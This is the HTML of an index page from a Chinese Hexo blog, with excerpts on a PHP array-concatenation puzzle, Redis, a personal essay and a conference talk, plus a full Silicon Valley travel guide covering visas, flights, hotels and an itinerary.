                  <a href="/categories/%E8%AF%AD%E8%A8%80/PHP/" itemprop="url" rel="index">
                    <span itemprop="name">PHP</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>问题叙述：将一个非负元素数组中的所有元素排列组合在一起，找出值最大的那个排列情况。例如 [0, 9, 523, 94, 10, 4]，排列组合后值最大数为：9945234100。</p>
<p><img src="//www.fanhaobai.com/2017/04/array-form-max-string/57f35c24-2eeb-4c68-bf28-0771b11cad34.png" alt="预览图">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/04/array-form-max-string/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/%E6%97%B6%E9%97%B4%E5%A6%82%E7%81%B0%E7%83%AC%E8%88%AC%E9%81%A5%E8%BF%9C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/%E6%97%B6%E9%97%B4%E5%A6%82%E7%81%B0%E7%83%AC%E8%88%AC%E9%81%A5%E8%BF%9C/" itemprop="url">时间如灰烬般遥远</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-02T16:25:21+00:00">
                2017-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%94%9F%E6%B4%BB%E6%84%9F%E6%82%9F/" itemprop="url" rel="index">
                    <span itemprop="name">生活感悟</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          或许 Kent 说得是对的，这个世界上并没有那么多，真正看重技术的公司，这个世界上普通如你我的人，无一不在做着普通的事情;天地间万事万物更迭交替，本来是自然界中最普通的规则，可是如果每年的这个时候，你都是一个人去看这山山水水，相比时空上的孤寂感，人的孤寂感会更为强烈，“良辰美景奈何天，赏心乐事谁家院”，外面的世界再纷繁多变，对你而言不过是活着的时间;Kent 是坐周五晚上的火车离开，晚上两个人一块儿吃饭，聊到了家里的琐事，聊到了工作的想法，唯独没有提到离别，大概是我不愿意说起
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/%E6%97%B6%E9%97%B4%E5%A6%82%E7%81%B0%E7%83%AC%E8%88%AC%E9%81%A5%E8%BF%9C/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/render-conf-oxford-2017">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/render-conf-oxford-2017" itemprop="url">Speaking at Render Oxford 2017</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-31T11:00:00+00:00">
                2017-03-31
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          I spoke at Render Conf 2017 in Oxford about web performance and images.
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/render-conf-oxford-2017">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/Redis%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E9%82%82%E9%80%85Redis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/Redis%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E9%82%82%E9%80%85Redis/" itemprop="url">Redis 缓存技术学习系列之邂逅 Redis</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-30T15:31:40+00:00">
                2017-03-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/" itemprop="url" rel="index">
                    <span itemprop="name">数据存储</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          ​        好了，这就是这篇博客的内容了，自我感觉 Redis 中的内容相对分散，这种细小的知识点都隐藏在命令中，最初在介绍不同的数据类型的时候，在文章中均做了详细的介绍并辅以终端脚本，可是最后发现这样写下去还不如去看官方文档，像 Redis 这种即使学习了都不见得有机会使用的技术，当然我并不是说 Redis 不好啊，关系型数据库目前依然是主流的技术驱动力量，所以我觉得我们学习的时候最好是“观其大略”、“不求甚解”，首先注重整体知识体系上的理解，微枝末叶上的细节问题可以在使用的时候去查阅文档;我们知道 Redis 是一个键-值数据库，所以在了解了 Redis 中支持的数据类型，即“值”以后，现在让我们将关注点回归到“键”上面来，这是因为作为一个键-值数据库，键是我们从数据库中获取值的唯一方式，因此在这里说说 Redis 中那些和键有关的命令，这些命令基本都遵循下面的命名格式，常见的命令有：;Redis 是一个采用键-值存储方案的数据库，因而传统关系型数据库里的 SQL 在这里将不再适用
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/Redis%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E9%82%82%E9%80%85Redis/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017-03-26-silicon-valley-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017-03-26-silicon-valley-3/" itemprop="url">硅谷之行（三）：硅谷旅行攻略</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-26T14:00:44+00:00">
                2017-03-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/summary/" itemprop="url" rel="index">
                    <span itemprop="name">summary</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>3 月 5 日 - 10 日，我参加了 <a target="_blank" rel="noopener" href="http://boolan.com/">Boolan</a> 组织的硅谷旅行团，然后在硅谷渡过了难忘的 5 天时间。</p>
<p>这次因为是参加的旅行团，所以花费还是比较高。我自己研究了一下，如果是自己自由行的话，估计能便宜不少。如果你像我一样，有不少朋友在硅谷的科技公司工作，可以考虑一下自己安排行程，估计花费能够控制在 1 万左右（4000 多的来回机票，4000 左右的住宿，2000 左右的交通、景点和餐饮）。</p>
<h3 id="签证"><a href="#签证" class="headerlink" title="签证"></a>签证</h3><p>美国签证十年有效，你其实并不需要确定行程再申请签证，完全可以说「有意向」参加什么样的旅行即可。美国签证需要面签，可以直接在美国大使馆相关的<a target="_blank" rel="noopener" href="http://www.ustraveldocs.com/cn_zh/">网页</a>上进行申请和交费。我第一次不太明白，找的是旅行社代理，其实完全没有必要。</p>
<p>签证通过之后，虽然是 10 年有效，但是美国大使馆要求大家每两年更新一次 <a target="_blank" rel="noopener" href="https://www.evus.gov/evus/">EVUS</a>，如果没有更新的话，下飞机入境的时候有可能会被拒绝入境哟！</p>
<p>签证是否通过非常看人品，我个人签证时非常顺利，时间短短不过两分钟。个人的经验是：回答签证官的问题时，不要太犹豫，犹豫的话，他会认为你有撒谎的嫌疑。就我面签当天的观察来看，反正被拒签的人也是挺多的。</p>
<h3 id="机票"><a href="#机票" class="headerlink" title="机票"></a>机票</h3><p>签证搞定之后就可以搞机票了，到硅谷玩可以有 3 个机票可供选择：北边的旧金山(SFO)机场，南边的圣何塞(San Jose)机场，东边的奥克兰(Oakland)机场。其实从距离来看的话，圣何塞离硅谷更近，比如今年 WWDC 17 的举办地，其实就在圣何塞。所以推荐大家按圣何塞 -&gt; 旧金山 -&gt; 奥克兰 这样的顺序来选择合适的机票。</p>
<p>如果提前三个月买票，另外不是旺季的话，同时购买往返的机票，其实很容易选择到往返 4000 左右的机票。下图是我在去哪儿上随意搜到的 4 月份的北京往返旧金山的直飞机票，价格 4000 出头。</p>
<img src="/images/silicon-valley-3-cb61a.png" class="">

<h3 id="酒店"><a href="#酒店" class="headerlink" title="酒店"></a>酒店</h3><p>酒店的话，美国整体的住宿都比国内贵很多，包括 Airbnb 也不便宜。如果想省钱，可以住 Motel，我们这次住的 <code>Travelodge San Francisco Airport North</code> 就是一家 Motel，提前预定的话，标间的价格大概在人民币 800 - 1000，这样一个人一天的住宿成本是 400 - 500。</p>
<p>如果你想住好一点，像这家 Motel 不远的 <code>Hyatt Regency San Francisco Airport</code> 就好很多，标间大概人民币 1400 - 1600，一个人 700 - 800 一天。</p>
<p>有一些酒店可能在不太安全的地方，如果你有朋友在硅谷，可以让他帮你参考一下。我这次去只是听说奥克兰那边可能有点乱。</p>
<p>预定酒店的话，可以选择 <a target="_blank" rel="noopener" href="http://www.booking.com/">http://www.booking.com/</a>。如果考虑在美国待一周的话，酒店花费约在 3500 - 5000 人民币，当然，你得至少找个同伴和你一起住标间才行。</p>
<h3 id="旅行准备"><a href="#旅行准备" class="headerlink" title="旅行准备"></a>旅行准备</h3><ul>
<li><p>最好准备一张美国当地的电话卡，淘宝上可以买到。我对比了一下，比移动和联通漫游过去的信号好一些，价格也更便宜一些。</p>
</li>
<li><p>信用卡，需要是 Visa 或 Master card，银联的很多地方无法刷卡。</p>
</li>
<li><p>美元现金。随便去一家银行即可兑换。我准备了 1000 美金，剩了很多，因为基本上都可以刷卡。不过多少还是得带一些，特别是给小费的时候需要。</p>
</li>
<li><p>下一些APP。比如 Google map，Google translate，Uber（绑定好支付的信用卡），yelp，有道词典, CrimeMapping。注意 Uber 不要下错了，要下在国外使用的 Uber，国内的那个 Uber 已经卖给滴滴了。</p>
</li>
<li><p>驾照和租车翻译件。如果你要租车的话。</p>
</li>
<li><p>电源转换插头。国内两头的插头🔌可以直接使用。三头的插头需要转换头。</p>
</li>
<li><p>充电宝。多搞几个，因为到了那儿老拍照录像，很费电。</p>
</li>
</ul>
<h3 id="倒时差"><a href="#倒时差" class="headerlink" title="倒时差"></a>倒时差</h3><p>我按照知乎上搜到的<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/19556483">「节食+早餐法」</a>，一路没有很强的时差反应，推荐给大家。</p>
<h3 id="行程安排"><a href="#行程安排" class="headerlink" title="行程安排"></a>行程安排</h3><p>再看看这张硅谷的地图：</p>
<img src="/images/silicon-valley.jpg" class="">

<p>可以看到景点都集中在北边或南边，所以推荐大家把游玩的景点分两部分：</p>
<ul>
<li>第一部分是最北边的旧金山市区。可以在那儿逛唐人街，金门大桥，吃螃蟹，也有一些科技公司（如 Airbnb, Twitter），博物馆可以逛。</li>
<li>第二部分是南边的硅谷区域，可以在那儿逛 Facebook, Google, Apple, 斯坦福大学，计算机博物馆。</li>
</ul>
<p>这两部分逛完之后，如果还有时间，可以考虑自驾去西边的一号公路。我这次是没有时间了，下次一定要体验一下。</p>
<p>选择酒店上，可以选择离 Caltrain 比较近的酒店，通过 Caltrain 来到最北边的旧金山市区以及南边的各大科技公司。也可以考虑前两天住在旧金山市区里面，后面几天搬到硅谷那边住，这样每天不用担心离酒店太远。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>如果你是程序员，那么一定要来硅谷玩一玩，也许你见了会说：「硅谷这个全世界的科技中心也就那样」，但是，只有来了你才有资格说这样的话。</p>
<p>希望这篇攻略能够帮到你。</p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/41/">&lt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/41/">41</a><span class="page-number current">42</span><a class="page-number" href="/page/43/">43</a><span class="space">&hellip;</span><a class="page-number" href="/page/74/">74</a><a class="extend next" rel="next" href="/page/43/">&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">1464</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">73</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">910</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5358884258"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Laird Lau</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
